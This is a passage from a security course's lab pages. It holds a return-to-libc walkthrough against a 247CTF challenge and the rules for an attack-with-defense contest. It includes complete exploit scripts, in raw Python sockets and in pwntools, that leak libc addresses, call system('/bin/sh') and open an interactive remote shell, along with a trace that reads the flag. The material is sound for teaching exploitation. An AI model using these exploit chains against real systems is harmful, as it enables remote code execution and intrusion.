password!\n[0xf7fd3069]&gt; s -\n[0x0804a018]&gt; pd 1\n            ; DATA XREF from sym.imp.puts @ 0x8048390\n            ;-- reloc.puts:\n            0x0804a018      .dword 0xf7e3b0a0                          ; RELOC 32 puts\n[0x0804a018]&gt; dmi libc puts\n[... redacted ...]\n458   0x000690a0 0xf7e3b0a0 WEAK   FUNC   416       puts\n[... redacted ...]\n[0x0804a018]&gt;\n</code></pre>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#libc-leakage","title":"<code>libc</code> leakage","text":"<p>With all of this in mind, we can construct our payload the same way as before, but instead, to reference the absolute address of the functions, we can use the address of the PLT known functions. We can use this technique only because the binary isn\u2019t a Position Independent Executable (PIE) and we can reference the absolute value of the PLT as we know where the binary will be mapped during execution (base address <code>0x8048000</code>).</p> <p>So, in this case, our payload will be like this:</p> <pre><code>[0x2c padding] + [puts@plt] + [dummy address] + [puts@got]\n</code></pre> <p>This time, we\u2019re calling the <code>puts@plt</code> at <code>0x08048390</code> with the <code>puts@got</code> at <code>0x0804a018</code> as a parameter (which it\u2019ll be sent to us as a string):</p> <pre><code>[0x2c padding] + [0x08048390] + [dummy address] + [0x0804a018]\n</code></pre> <p>If we try our newly crafted payload:</p> <pre><code>$ python2 -c 'print(\"A\"*0x2c + \"\\x90\\x83\\x04\\x08\" + \"A\"*4 + \"\\x18\\xa0\\x04\\x08\")' | nc ad520e503a0ec4e0.247ctf.com 50341 | xxd\n00000000: 456e 7465 7220 7468 6520 7365 6372 6574  Enter the secret\n00000010: 2070 6173 7377 6f72 643a 0a49 6e63 6f72   password:.Incor\n00000020: 7265 6374 2073 6563 7265 7420 7061 7373  rect secret pass\n00000030: 776f 7264 210a 60d3 dbf7 90ed d6f7 0a    word!.`........\n</code></pre> <p>So, now we know that <code>puts</code> in the server is placed at <code>0xf7dbd360</code> address. With this information, we can search a libc database to download this specific version (<code>libc6-i386_2.27-3ubuntu1_amd64</code>). In case that address matches different versions, we can leak other addresses as <code>gets</code> or <code>strcmp</code> to limit the results.</p> <p></p> <p>If we run again our Python command with the payload, we\u2019ll see that this time <code>puts</code> address is different, so we can confirm that the remote server has ALSR activated.</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#payload-construction","title":"Payload construction","text":"<p>The main problem here is that we need to know the base address of the <code>libc</code> library to construct our payload. We can obtain it thanks to the <code>puts</code> address leakage:</p> <pre><code>[libc base adddress] = [puts address leaked] - [libc6-i386_2.27-3ubuntu1_amd64.puts RVA]\n</code></pre> <p>But if we provide a dummy address to the payload, the remote program will crash, and in the next execution, the base address will be different. So, we can provide the <code>main</code> address to continue execution and interact again with the program and the vulnerable gets function to overwrite again the return address, this time with the first payload we described earlier, but instead of referencing the absolute addresses, we can use them as:</p> <pre><code>[function VA] = [libc base address] + [function RVA]\n</code></pre> <p>Be aware that the second padding of the payload may change, so you need to recalculate it again, but we\u2019re lucky enough and this time the padding is the same. With all of this in mind, here is what our final script would look like:</p> <pre><code>import socket\nimport struct\n\nhostname = 'ad520e503a0ec4e0.247ctf.com'\nport = 50341\n\nconn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    # TCP socket\nconn.connect((hostname, port))\n\nprint('[*] Connected to {}:{}'.format(hostname, port))\n\nconn.recv(1024)\n\npayload = b'A' * 0x2c\npayload += struct.pack('&lt;I', 0x08048390)    # puts@plt\npayload += struct.pack('&lt;I', 0x0804853d)    # main\npayload += struct.pack('&lt;I', 0x0804a018)    # puts@got\nconn.sendall(b'%b\\r\\n' % payload)\nprint('[*] Payload sent: {}B'.format(len(payload)))\n\ndata = conn.recv(1024).split(b'\\n')[1]\nputs_leak = struct.unpack('&lt;I', data[:4])[0]\nprint('[*] puts leaked address: {:#x}'.format(puts_leak))\n\nlibc_base = puts_leak - 0x67360\nprint('[*] libc base address: {:#x}'.format(libc_base))\n\nlibc_system = libc_base + 0x3cd10\nlibc_exit = libc_base + 0x2ff70\nlibc_shell = libc_base + 0x17b8cf\n\npayload = b'A' * 0x2c\npayload += struct.pack('&lt;I', libc_system)\npayload += struct.pack('&lt;I', libc_exit)\npayload += struct.pack('&lt;I', libc_shell)\nconn.sendall(b'%b\\r\\n' % payload)\nprint('[*] Payload sent: {}B'.format(len(payload)))\nconn.recv(1024)\n\nprint('[*] Interactive shell\\n')\n\ntry:\n    command = input('$ ')\n\n    while command != 'exit':\n        conn.sendall('{}\\n'.format(command).encode('utf-8'))\n        print(conn.recv(1024).decode('utf-8'), end='')\n        command = input('$ ')\nexcept (EOFError, KeyboardInterrupt):\n    pass\n\nconn.close()\n</code></pre> <p>And an execution trace:</p> <pre><code>$ python3 exploit-remote.py\n[*] Connected to ad520e503a0ec4e0.247ctf.com:50341\n[*] Payload sent: 56B\n[*] puts leaked address: 0xf7d5d360\n[*] libc base address: 0xf7cf6000\n[*] Payload sent: 56B\n[*] Interactive shell\n\n$ ls\nchall\nflag_[0-9]+.txt\n$ cat flag_[0-9]+.txt\n247CTF{[a-f0-9]{32}}\n$ exit\n</code></pre>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#pwntools","title":"pwntools","text":"<p>This blog post is already long enough, so I\u2019ll only show how <code>exploit-remote.py</code> script looks when ported to pwntools. I\u2019ll leave all details up to you but the library is pretty straightforward:</p> <pre><code>import pwn\n\nhostname = 'ad520e503a0ec4e0.247ctf.com'\nport = 50341\n\nio = pwn.remote(hostname, port)\n\nelf = pwn.ELF('non_executable_stack')\nlibc = pwn.ELF('libc6-i386_2.27-3ubuntu1_amd64.so')\n\npayload = b'A' * 0x2C\npayload += pwn.p32(elf.plt['puts'])\npayload += pwn.p32(elf.symbols['main'])\npayload += pwn.p32(elf.got['puts'])\n\nio.recvline()\nio.sendline(payload)\npwn.log.info('Payload sent: {}B'.format(len(payload)))\nio.recvline()\nputs_leak = pwn.u32(io.recvline()[:4])\npwn.log.info('puts leaked address: {:#x}'.format(puts_leak))\n\nlibc_base = puts_leak - libc.symbols['puts']\npwn.log.info('libc base address: {:#x}'.format(libc_base))\nlibc_system = libc_base + libc.symbols['system']\nlibc_exit = libc_base + libc.symbols['exit']\nlibc_shell = libc_base + next(libc.search(b'/bin/sh\\x00'))\n\npayload = b'A' * 0x2C\npayload += pwn.p32(libc_system)\npayload += pwn.p32(libc_exit)\npayload += pwn.p32(libc_shell)\n\nio.recvline()\nio.sendline(payload)\npwn.log.info('Payload sent: {}B'.format(len(payload)))\nio.recvline()\nio.interactive()\n</code></pre>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#assignment","title":"Assignment","text":""},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#believe-in-the-rop","title":"Believe in the ROP","text":"<p>A tutorial to the ROP.</p> <p>Attachment</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#list","title":"List","text":"<p>Do you know return to libc?</p> <p>Attachment</p>"},{"location":"CS315/Lab%2011%20Return-to-libc%20%26%20Return%20Oriented%20Programming/#ebpf","title":"eBPF","text":"<p>A challenge, a real challenge, for your last CTF for this semester! \ud83c\udfb6\ud83c\udfb6\ud83c\udfb6</p> <p><code>nc 103.125.216.173 9009</code></p> <p>Attachment</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/","title":"Attack with Defense","text":"<p>Attack with Defense \u662f CTF \u653b\u9632\u6bd4\u8d5b\u6a21\u5f0f\u3002\u533a\u522b\u4e8e\u4f20\u7edf\u7684 Jeopardy \u89e3\u9898\u6a21\u5f0f\uff0cAWD \u66f4\u6ce8\u91cd\u65f6\u6548\u6027\uff0c\u4e14\u5bf9\u53c2\u8d5b\u9009\u624b\u7684\u653b\u51fb\u3001\u9632\u5fa1\u6280\u80fd\u5747\u6709\u6240\u8981\u6c42\u3002</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_1","title":"\u5b9a\u4e49","text":"<p>AWD \u4e2d\u6709\u5982\u4e0b\u5b9a\u4e49\uff1a</p> <ul> <li>\u6bd4\u8d5b\uff1a\u6307\u4ece\u5f00\u59cb\u5230\u7ed3\u675f\u7684\u4e00\u6574\u573a\u6bd4\u8d5b\u8fc7\u7a0b\u3002</li> <li>\u8f6e\uff1a\u6307\u4e00\u4e2a\u5355\u72ec\u7684\u65f6\u95f4\u533a\u95f4\uff0c\u5206\u6570\u8ba1\u7b97\u7684\u6700\u5c0f\u5468\u671f\uff0c\u4e00\u822c\u4e3a 10 \u5206\u949f\u3002 \u4e00\u573a\u6bd4\u8d5b\u7531\u8bb8\u591a\u8f6e\u7ec4\u6210\uff0c\u53ef\u4ee5\u7406\u89e3\u4e3a\uff1a<code>\u603b\u8f6e\u6570 = \u6bd4\u8d5b\u603b\u65f6\u957f / \u5355\u8f6e\u65f6\u957f</code>\u3002</li> <li>\u9009\u624b\uff1a\u6307\u6bd4\u8d5b\u7684\u53c2\u8d5b\u961f\u4f0d\uff0c\u901a\u5e38\u662f\u4e00\u4e2a 3-5 \u4eba\u7684\u56e2\u961f\u3002</li> <li>\u9898\u76ee\uff1a\u6bd4\u8d5b\u7684\u8bd5\u9898\uff0c\u5bf9\u5e94\u7740\u4f20\u7edf Jeopardy \u6a21\u5f0f\u4e2d\u7684\u4e00\u9053\u9053\u9898\u76ee\u3002</li> <li>\u9776\u673a\uff1aAWD \u6a21\u5f0f\u4e2d\uff0c\u5bf9\u4e8e\u6bcf\u4e00\u9053\u9898\u76ee\uff0c\u6bcf\u4e2a\u9009\u624b\u90fd\u4f1a\u6709\u4e00\u4e2a\u81ea\u5df1\u7684\u72ec\u7acb\u9776\u673a\uff0c\u4e0a\u9762\u8fd0\u884c\u7740\u8fd9\u4e2a\u9898\u76ee\u7684\u73af\u5883\u3002</li> <li>Check\uff1a\u4e3a\u4e86\u68c0\u6d4b\u9009\u624b\u7684\u9776\u673a\u670d\u52a1\u4ee5\u53ca\u529f\u80fd\u662f\u5426\u80fd\u591f\u6b63\u5e38\u8fd0\u884c\uff0c\u4e3b\u529e\u65b9\u4f1a\u4e0d\u5b9a\u671f\u8fd0\u884c Check\uff0c\uff08\u901a\u5e38\u662f\u4e00\u6bb5\u81ea\u52a8\u8bf7\u6c42\u5e76\u9a8c\u8bc1\u7684\u811a\u672c\uff09\u7528\u4ee5\u68c0\u6d4b\u670d\u52a1\u53ef\u7528\u6027\u3002\u68c0\u6d4b\u5230\u670d\u52a1\u4e0d\u53ef\u7528\uff0c\u529f\u80fd\u4e0d\u5168\u7684\u9776\u673a\uff0c\u5176\u6240\u5c5e\u961f\u4f0d\u5c06\u88ab\u6263\u5206\u3002\uff08Check \u7684\u5b58\u5728\uff0c\u662f\u4e3a\u4e86\u9632\u6b62\u9009\u624b\u6545\u610f\u5220\u7ad9\uff0c\u6216\u90e8\u7f72\u901a\u9632\u6765\u4f7f\u5f97\u653b\u51fb\u65b9\u65e0\u6cd5\u5bf9\u5176\u9776\u673a\u8fdb\u884c\u653b\u51fb\uff0c\u4ece\u800c\u8fbe\u5230\u6240\u8c13\u201c\u7edd\u5bf9\u7684\u9632\u5fa1\u201d\uff09</li> <li>\u670d\u52a1\u5b95\u673a / CheckDown\uff1a\u6307\u9009\u624b\u7684\u9776\u673a\u670d\u52a1\u4e0d\u53ef\u7528\uff0c\u6216\u529f\u80fd\u4e0d\u5168\u3002</li> </ul> <p></p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_2","title":"\u6bd4\u8d5b\u8fc7\u7a0b","text":""},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_3","title":"\u6bd4\u8d5b\u5f00\u59cb\u524d","text":"<ul> <li>\u6bcf\u4e2a\u53c2\u8d5b\u9009\u624b\u5747\u4f1a\u62ff\u5230\u81ea\u5df1\u7684\u6bd4\u8d5b\u5e73\u53f0\u8d26\u53f7\uff0c\u767b\u5f55\u8d26\u53f7\u5373\u53ef\u8fdb\u5165\u5e73\u53f0\uff0c\u53ef\u67e5\u770b\u516c\u544a\u4fe1\u606f\u3002</li> <li>\u6bd4\u8d5b\u5f00\u59cb\u524d\uff0c\u9009\u624b\u65e0\u6cd5\u67e5\u770b\u81ea\u5df1\u7684\u9776\u673a\u4fe1\u606f\u3002</li> </ul>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_4","title":"\u6bd4\u8d5b\u5f00\u59cb","text":"<ul> <li>\u9009\u624b\u53ef\u4ee5\u67e5\u770b\u81ea\u5df1\u7684\u9776\u673a\u4fe1\u606f\uff0c\u5176\u4e2d\u5305\u62ec\u9776\u673a\u7684 IP \u5730\u5740\uff0c\u9776\u673a SSH \u8d26\u53f7\u53ca\u5bc6\u7801\u3002</li> <li>\u7b2c\u4e00\u8f6e\u5f00\u59cb\u3002</li> </ul>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_5","title":"\u65b0\u7684\u4e00\u8f6e\u5f00\u59cb","text":"<ul> <li>\u6240\u6709\u7684\u9776\u673a\u72b6\u6001\u6062\u590d\u4e3a\u6b63\u5e38\u3002</li> <li>\u5012\u8ba1\u65f6\u91cd\u7f6e</li> </ul>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_6","title":"\u4e00\u8f6e\u8fdb\u884c\u4e2d","text":"<ol> <li>\u653b\u51fb\u6210\u529f</li> </ol> <p>\u6210\u529f\u5229\u7528\u5176\u4ed6\u961f\u4f0d\u9776\u673a\u4e0a\u7684\u6f0f\u6d1e\uff0c\u83b7\u53d6\u5230\u5bf9\u65b9\u9776\u673a\u4e0a\u7684 Flag \u5e76\u63d0\u4ea4\uff0c\u5373\u653b\u51fb\u6210\u529f\u3002\u6b64\u65f6\uff0c\u88ab\u653b\u51fb\u7684\u961f\u4f0d\u7684\u9776\u673a\u5c06\u663e\u793a\u4e3a\u201c\u88ab\u653b\u9677\u201d\u72b6\u6001\u3002</p> <ol> <li>\u88ab\u653b\u9677</li> </ol> <p>\u5f53\u9776\u673a\u4e0a\u7684 Flag \u88ab\u5176\u4ed6\u961f\u4f0d\u63d0\u4ea4\u65f6\uff0c\u8be5\u9776\u673a\u5c06\u663e\u793a\u4e3a\u201c\u88ab\u653b\u9677\u201d\u72b6\u6001\u3002</p> <ol> <li>\u88ab\u68c0\u6d4b\u5230\u670d\u52a1\u5b95\u673a\uff08CheckDown\uff09</li> </ol> <p>\u5f53 Check \u811a\u672c\u8fd0\u884c\u540e\uff0c\u68c0\u6d4b\u5230\u9776\u673a\u670d\u52a1\u4e0d\u53ef\u7528\u6216\u529f\u80fd\u4e0d\u5168\uff0c\u5219\u8be5\u9776\u673a\u5c06\u663e\u793a\u4e3a\u201c\u5b95\u673a\u201d\u72b6\u6001\u3002</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_7","title":"\u4e00\u8f6e\u7ed3\u675f\u65f6","text":"<ul> <li>\u7ed3\u7b97\u4e0a\u4e00\u8f6e\u5404\u961f\u4f0d\u5f97\u5931\u5206\u6570\uff0c\u5e76\u66f4\u65b0\u6392\u884c\u699c\u3002</li> </ul>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_8","title":"\u5206\u6570\u7ed3\u7b97\u89c4\u5219","text":"<p>\u8fd9\u91cc\u5047\u8bbe\u5728 Cardinal \u914d\u7f6e\u6587\u4ef6\u4e2d\uff0c\u653b\u51fb\u5931\u5206\u4e3a 50 \u5206\uff0c\u5b95\u673a\u5931\u5206\u4e3a 50 \u5206\u3002</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_9","title":"\u88ab\u653b\u51fb\u5931\u5206","text":"<p>\u88ab\u653b\u51fb\u7684\u9776\u673a\uff0c\u5c06\u51cf\u53bb 50 \u5206\u3002</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_10","title":"\u653b\u51fb\u5f97\u5206","text":"<p>\u5728\u8be5\u8f6e\u4e2d\u6210\u529f\u653b\u51fb\u8be5\u9776\u673a\u7684\u6240\u6709\u961f\u4f0d\uff0c\u4e00\u8d77\u5e73\u5206\u8be5\u9776\u673a\u6263\u5206\u65f6\u5931\u53bb\u7684\u7684\u5206\u6570\u3002\u5f97\u5206\u52a0\u5230\u5404\u81ea\u76f8\u5e94\u9898\u76ee\u7684\u9776\u673a\u4e0a\u3002</p> <p>\u4f8b\u5982\uff1aJohn \u653b\u51fb\u4e86 Alice \u7684 Web1 \u9776\u673a\uff1bMashiro \u653b\u51fb\u4e86 Alice \u7684 Web1 \u9776\u673a\u3002</p> <p>\u5219 Alice \u7684 Web1 \u9776\u673a -50 \u5206\u3002John \u548c Mashiro \u5404\u81ea\u7684 Web1 \u9776\u673a\u5e73\u5206\u8fd9\u51cf\u53bb\u7684 50 \u5206\u3002\u5373 John \u548c Mashiro \u6bcf\u4eba +25 \u5206\u3002</p> <p>\u6b64\u65f6\u5168\u90e8\u961f\u4f0d\u7684\u52a0\u5206\u4e0e\u6263\u5206\u4e4b\u548c\uff0c\u4f9d\u7136\u4e3a\u96f6\u3002</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#checkdown","title":"\u5b95\u673a\uff08CheckDown\uff09\u5931\u5206","text":"<p>\u88ab Check \u68c0\u6d4b\u5230\u670d\u52a1\u5b95\u673a\u7684\u9776\u673a\uff0c\u5c06\u51cf\u53bb 50 \u5206\u3002</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_11","title":"\u670d\u52a1\u6b63\u5e38\u5f97\u5206","text":"<p>\u5728\u8be5\u8f6e\u4e2d\u9898\u76ee\u670d\u52a1\u6b63\u5e38\u7684\u9776\u673a\uff0c\u5e73\u5206\u8be5\u9898\u76ee\u4e0b\uff0c\u6240\u6709\u5b95\u673a\u9776\u673a\u5931\u53bb\u7684\u5206\u6570\u3002</p> <p>\u4f8b\u5982\uff1aJohn\u3001Alice\u3001Mashiro \u7684 Pwn2 \u9776\u673a\u88ab\u68c0\u6d4b\u5224\u5b9a\u4e3a\u670d\u52a1\u5b95\u673a\uff0cAsuna\u3001Emiria \u7684 Pwn2 \u9776\u673a\u4e00\u76f4\u670d\u52a1\u6b63\u5e38\u3002</p> <p>\u5219 John\u3001Alice\u3001Mashiro \u7684 Pwn2 \u9776\u673a\u5404 -50 \u5206\u3002Asuna \u548c Emiria \u7684 Pwn2 \u9776\u673a\u5e73\u5206\u8fd9\u51cf\u53bb\u7684 150 \u5206\u3002\u5373 Asuna \u548c Emiria \u6bcf\u4eba\u5404 +75 \u5206\u3002</p> <p>\u6b64\u65f6\u5168\u90e8\u961f\u4f0d\u7684\u52a0\u5206\u4e0e\u6263\u5206\u4e4b\u548c\uff0c\u4f9d\u7136\u4e3a\u96f6\u3002</p>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_12","title":"\u6bd4\u8d5b\u5b89\u6392","text":""},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_13","title":"\u6bd4\u8d5b\u65f6\u95f4","text":"<p>\u6bd4\u8d5b\u65f6\u95f4\u572812\u670819\u65e5\uff0c\u4e0b\u534817:00\u5f00\u59cb\uff0c\u81f3\u665a20:50\u7ed3\u675f\u3002</p> <p>\u6bd4\u8d5b\u5b89\u6392\u5206\u4e3a\u4e09\u6bb5\uff1a</p> <ul> <li>\u9898\u76ee\u6d4b\u8bd5\u4e0e\u4fee\u590d\u73af\u8282\uff1a\u4e0b\u534817:00 - 18:00\uff0c\u53ef\u4ee5\u67e5\u770b\u9898\u76ee\u4e0e\u4fee\u590d\uff0c\u53ef\u4ee5\u8bbe\u8ba1\u811a\u672c\uff0c\u53ef\u4ee5\u767b\u5f55\u81ea\u5df1\u7684\u670d\u52a1\u5668\uff0c\u4f46\u4e0d\u80fd\u653b\u51fb\u5176\u4ed6\u4eba\u7684\u670d\u52a1\u5668\uff0c\u4e5f\u4e0d\u4f1a\u8ba1\u5206\u3002</li> <li>\u51bb\u7ed3\u65f6\u95f4\uff1a\u4e3a\u4e86\u65b9\u4fbf\u540c\u5b66\u4eec\u6309\u65f6\u5403\u996d\uff0c\u4fdd\u91cd\u8eab\u4f53\uff0c\u572818:00 - 19:00\u4e4b\u95f4\uff0c\u6bd4\u8d5b\u5e73\u53f0\u5c06\u4f1a\u5f7b\u5e95\u5173\u95ed\uff0c\u4e0d\u5141\u8bb8\u767b\u5f55\u670d\u52a1\u5668\u770b\u9898\uff0c\u4e5f\u4e0d\u5141\u8bb8\u63d0\u4ea4FLAG\u3002</li> <li>\u653b\u9632\u73af\u8282\uff1a\u4e0b\u534819:10 - 20:50\uff0c\u53ef\u4ee5\u5f00\u59cb\u63d0\u4ea4\u9898\u76eeflag\uff0c\u6b64\u9636\u6bb5\u5c06\u4f1a\u5206\u4e3a20\u8f6e\uff08\u6bcf\u4e00\u8f6e5\u5206\u949f\uff09\uff0c\u6bcf\u4e00\u8f6e\u6bcf\u4e00\u961f\u7684flag\u5c06\u4f1a\u66f4\u65b0\uff0c\u53ef\u4ee5\u63d0\u4ea4\u5176\u4ed6\u961f\u4f0d\u7684flag\u3002</li> <li>\u8fd9\u662f\u4ec0\u4e48\u610f\u601d\u5462\uff1f\u5047\u5b9a\u5c0fA\u5728\u7b2c\u4e00\u8f6e\u5c31\u62ff\u5230\u4e86\u6f0f\u6d1e\uff0c\u5979\u5728\u8fd9\u65f6\u5199\u597d\u4e86\u653b\u51fb\u5176\u4ed6\u4eba\u7684\u811a\u672c\uff0c\u5e78\u8fd0\u7684\u5c0fB\u5728\u7b2c\u4e8c\u8f6e\u5c31\u4fee\u597d\u4e86\u6f0f\u6d1e\uff0c\u8fd9\u6837\u5c0fA\u53ea\u62ff\u5230\u4e86\u5c0fB\u4e00\u8f6e\u7684\u5206\u6570\uff0c\u4f46\u662f\u5c0fE\u76f4\u5230\u6bd4\u8d5b\u7ed3\u675f\u4e5f\u6ca1\u627e\u5230\u6f0f\u6d1e\u5728\u54ea\u91cc\uff0c\u4e8e\u662f\u60b2\u60e8\u5730\u4e22\u6389\u4e86\u4ece\u7b2c\u4e00\u8f6e\u5230\u6700\u540e\u7684\u5206\u6570\u3002</li> <li>\u6240\u4ee5\u8981\u5c3d\u5feb\u8bbe\u8ba1\u653b\u51fb\uff0c\u5c3d\u5feb\u8fdb\u884c\u4fee\u590d\uff0c\u8d8a\u5feb\u5f97\u5230\u7684\u597d\u5904\u5c31\u8d8a\u591a\u3002</li> </ul>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_14","title":"\u6bd4\u8d5b\u73af\u5883","text":"<p>\u961f\u4f0d\u73af\u5883\uff1a\u6bcf\u4e00\u652f\u961f\u4f0d\u5c06\u4f1a\u62e5\u6709\u4e24\u4e2a\u9776\u673a\u73af\u5883\uff08docker\uff09\uff0c\u5176\u4e2d\u6bcf\u4e2a\u9776\u673a\u6709\u4e00\u79cd\u4e0d\u540c\u7684\u670d\u52a1\uff0c\u5206\u522b\u4e3a\u4e8c\u8fdb\u5236\u5229\u7528\u7684pwn\uff0c\u4ee5\u53ca\u96c6\u6210\u4e86\u591a\u9879\u7f51\u7edc\u529f\u80fd\u7684web\u5229\u7528\u3002\u901a\u8fc7\u7aef\u53e3\u4e0e\u5916\u754c\u901a\u4fe1\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5176\u4ed6\u961f\u4f0d\u9776\u673a\u73af\u5883\u7684\u7aef\u53e3\u8bbf\u95ee\u5176\u4ed6\u961f\u4f0d\u7684\u670d\u52a1\uff0c\u5e76\u8fdb\u884c\u653b\u51fb\u3002</p> <ul> <li>\u6bcf\u4e2a\u9776\u673a\u62e5\u6709\u4e24\u4e2a\u5916\u90e8\u7aef\u53e3\uff0c\u5176\u4e2d\u4e00\u4e2a\u5bf9\u5e94\u5185\u90e8docker\u7684\u4e8c\u8fdb\u5236\u7a0b\u5e8f\uff08\u9700\u8981\u4f7f\u7528netcat\u94fe\u63a5\uff09\uff0c\u53e6\u4e00\u4e2a\u9776\u673a\u5219\u5bf9\u5e94\u5185\u7f51\u768480\u7aef\u53e3\uff08\u7f51\u7ad9\u5e94\u7528\uff09\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u6bcf\u4e2a\u9776\u673a\u8fd8\u4f1a\u62e5\u6709\u4e00\u4e2aSSH\u767b\u5f55\u7aef\u53e3\uff0c\u521d\u59cb\u60c5\u51b5\u4e0b\uff0cSSH\u767b\u9646\u7684\u5bc6\u7801\u662f\u76f8\u540c\u7684\uff0c\u6bcf\u652f\u961f\u4f0d\u5171\u4eab\u540c\u6837\u7684SSH\u767b\u5f55\u8d26\u53f7\u548c\u5bc6\u7801\uff0c\u6240\u4ee5\u5728\u767b\u5f55\u5230SSH\u4e4b\u540e\uff0c\u7b2c\u4e00\u4ef6\u4e8b\u60c5\u5c31\u662f\u4fee\u6539\u81ea\u5df1\u7684SSH\u5bc6\u7801\uff0c\u5e76\u544a\u77e5\u961f\u53cb\u3002</li> <li>\u3010\u91cd\u8981\u3011\u4e25\u7981\u76f4\u63a5\u901a\u8fc7\u9ed8\u8ba4\u5bc6\u7801\u767b\u5f55\u5176\u4ed6\u961f\u4f0d\u7684SSH\uff0c\u8fd9\u4e00\u70b9\u542b\u91d1\u91cf\u90fd\u6ca1\u6709\u3002</li> <li>\u6bcf\u53f0\u9776\u673a\u62e5\u6709\u81ea\u5df1\u7684/flag.txt\u6587\u4ef6\uff0c\u8fd9\u662f\u4e00\u4e2a\u6743\u9650\u4e3a640\u7684\u5c5e\u4e8eroot\u7684\u6587\u4ef6\uff0c\u4ec5\u5141\u8bb8root\u7528\u6237\u5bf9\u5176\u66f4\u65b0\uff0c\u4f4e\u6743\u9650\u7528\u6237\u4ec5\u80fd\u8bfb\u53d6\u5176\u4e2d\u7684\u5185\u5bb9\u3002\u4e24\u53f0\u9776\u673a\u62e5\u6709\u4e0d\u540c\u7684/flag.txt\uff0c\u961f\u4f0d\u767b\u5f55SSH\u7684\u4f4e\u6743\u9650\u8d26\u53f7\u65e0\u6cd5\u66f4\u6539flag.txt\u7684\u5185\u5bb9\uff0c\u6bcf\u4e00\u8f6e\u90fd\u4f1a\u6709\u811a\u672c\u66f4\u65b0/flag.txt\u6587\u4ef6\u3002</li> </ul> <p>\u5982\u679c\u8981\u5bf9\u81ea\u5df1\u7684\u670d\u52a1\u8fdb\u884c\u4fee\u590d\uff0c\u9700\u8981\u901a\u8fc7SSH\u670d\u52a1\u7aef\u53e3\u767b\u5f55\uff0c\u793a\u4f8b\u4ee3\u7801\u4e3a\uff1a</p> <pre><code>$ ssh ctf@&lt;ip&gt; -p&lt;port&gt;\n</code></pre>"},{"location":"CS315/Lab%2012%20Attack-with-Defense/#_15","title":"\u5206\u6570\u8bbe\u8ba1","text":"<p>\u6bd4\u8d5b\u5206\u6570\uff1a</p> <ul> <li>\u57fa\u7840\u5206\u6570\uff0c\u5bf9\u4e8e\u6bcf\u4e2a\u9776\u673a\uff0c\u6bcf\u4e2a\u9898\u76ee\u7684\u521d\u59cb\u5206\u6570\u4e3a1,000\u5206\uff0c\u5373\u6bcf\u652f\u961f\u4f0d\u7684\u521d\u59cb\u5206\u6570\u4e3a2,000\u5206\uff0c\u968f\u7740\u6bd4\u8d5b\u8fdb\u884c\uff0c\u5206\u6570\u4f1a\u4e0a\u5347\u6216\u4e0b\u964d\u3002</li> <li>\u4f1a\u4e0d\u4f1a\u51fa\u73b0\u8d1f\u5206\uff1f\u4f1a\uff0c\u6bcf\u4e00\u8f6e\u7684\u5b95\u673a/\u653b\u9677\u5206\u6570\u5206\u522b\u4e3a50\u5206\uff0c\u5018\u82e5\u6b64\u8f6e\u540c\u65f6\u89e6\u53d1\u5b95\u673a\u4e0e\u653b\u9677\uff0c\u5219\u4f1a\u5bfc\u81f4\u6b64\u8f6e\u4e22\u5931100\u5206\uff0c\u5728\u5171\u8ba120\u8f6e\u4e2d\uff0c\u6709\u53ef\u80fd\u51fa\u73b0\u8d1f\u5206\u3002</li> <li>\u5956\u52b1\u5206\u6570\uff0c\u5bf9\u4e8e\u6bcf\u652f\u961f\u4f0d\uff0c\u5c06\u4f1a\u8003\u8651\u672c\u5b66\u671fCTF\u5468\u4f5c\u4e1a\u7684\u5956\u52b1\u9898\u76ee\u4e0e\u5bf9\u5e94\u7684\u5206\u6570\uff0c\u672c\u5b66\u671f\u5171\u8ba1\u670910\u4e2a\u5956\u52b1\u9898\u76ee\uff0c\u6bcf\u4e00\u9898\u5c06\u4f1a\u4e3a\u961f\u4f0d\u589e\u52a010%\u7684\u603b\u5206\uff08\u82e5\u591a\u540d\u961f\u5458\u901a\u8fc7\u4e86\u540c\u4e00\u4e2a\u5956\u52b1\u9898\u76ee\uff0c\u5219\u4e0d\u4f1a\u5bf9\u672c\u9898\u53e0\u52a0\uff09\uff0c\u6700\u9ad8\u53ef\u4ee5\u7d2f\u8ba1+100%\u603b\u5206\u3002</li> <li>\u5206\u6570\u4e0a\u9650\u4e0e\u4e0b\u9650\uff0c\u521d\u8bd5\u5206\u6570\u4e3a\u6700\u5927\u5206\u6570\u768450%\uff0c\u5373\u5408\u6cd5\u7684\u5206\u6570\u533a\u95f4\u662f0\u81f34,000\u5206\uff0c\u5c06\u4f1a\u6620\u5c04\u52300\u81f3130\u5206\uff0c\u5bf9\u5e94\u603b\u8bc4\u4e2d\u7684AWD\u90e8\u5206\u5f97\u5206\u3002\u4f4e\u4e8e0\u5206\u6216\u9ad8\u4e8e4,000\u5206\u4e0d\u4f1a\u5bfc\u81f4\u603b\u8bc4\u4f4e\u4e8e0\u5206\u6216\u9ad8\u4e8e130\u5206\u3002</li> 